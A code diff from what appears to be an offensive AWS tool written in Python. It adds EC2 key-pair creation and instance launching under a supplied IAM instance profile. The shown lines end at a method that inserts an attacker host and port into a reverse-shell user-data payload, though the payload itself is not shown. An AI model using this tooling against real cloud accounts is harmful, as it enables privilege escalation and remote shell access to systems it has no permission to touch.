@@ -1,5 +1,7 @@
 from botocore.exceptions import ClientError
 from os import mkdir
+from time import sleep
+from os.path import exists
 
 class Ec2():
 
@@ -19,7 +21,8 @@ class Ec2():
                         DryRun=dry
                     )
                     self.console.print("Creating directory: `keys` ([bold blue]CREATED DIRECTORY[/bold blue]) ")
-                    mkdir("./keys")
+                    if not exists("./keys"):
+                        mkdir("./keys")
                     with open(f"./keys/{key_name}.pem", "w") as priv_key:
                         self.console.print(f"Writing PEM key to file: `./keys/{key_name}.pem`.. ([bold blue]CREATED FILE[/bold blue])")
                         priv_key.write(key_pair["KeyMaterial"])
@@ -38,7 +41,7 @@ class Ec2():
         if success:
             self.console.print("You have the required permissions to create a key pair ([green]SUCCESS[/green])")
             if y_n := self.console.input(
-                "Would you like to create the key pair? ([blue]y[/blue]/[red]n[/red]): "
+                "Would you like to create the key pair? (y/n): "
             ).strip().lower() == "y":
                 _create(key_name, dry=False)
             else:
@@ -48,13 +51,37 @@ class Ec2():
             self.console.print("You do not have the required permission to create a key pair ([red]OPERATIONE FAILED[/red])")
 
     def _run_instance(
-        self, key_name: str, instance_type: str):
-        pass
+        self, key_name: str, ami_id: str, security_groups_ids: list,
+        subnet_id: str, instance_type: str, instance_profile_arn: str
+        ):
+        try:
+            results = self.ec2.run_instances(
+                ImageId=ami_id,
+                InstanceType=instance_type,
+                SecurityGroupIds=security_groups_ids,
+                IamInstanceProfile={"Arn": instance_profile_arn},
+                SubnetId=subnet_id,
+                KeyName=key_name,
+                MaxCount=1,
+                MinCount=1
+            )
+            self.console.print("Successfully launched Ec2 instance.. ([green]SUCCESS[/green])")
+            instance_id = results["Instances"][0]["InstanceId"]
+            self.console.print("\t\u2022 Instance ID:", instance_id)
+            self.console.print("Retrieving instance public IP address.. ([blue]INFO[/blue])")
+            sleep(5)
+            results = self.ec2.describe_instances(InstanceIds=[instance_id])
+            self.console.print("\t\u2022 Public IP Address:", results["Reservations"][0]["Instances"][0]["PublicIpAddress"])
+        except ClientError as e:
+            print(e)
 
-    def launch_ec2_instance_profile(
-        self, key_name: str, instance_profile_arn: str):
+    def launch_ec2_with_instance_profile(
+        self, key_name: str, ami_id: str, security_group_ids: list,
+        subnet_id: str, instance_type: str, instance_profile_arn: str
+        ):
         self._create_key_pair(key_name)
-        self._run_instance(key_name)
+        sleep(1)
+        self._run_instance(key_name, ami_id, security_group_ids, subnet_id, instance_type, instance_profile_arn)
 
     def user_data_rev_shell(self, rhost: str, rport: int):
         self.user_data_payload.replace("<rhost>", rhost)
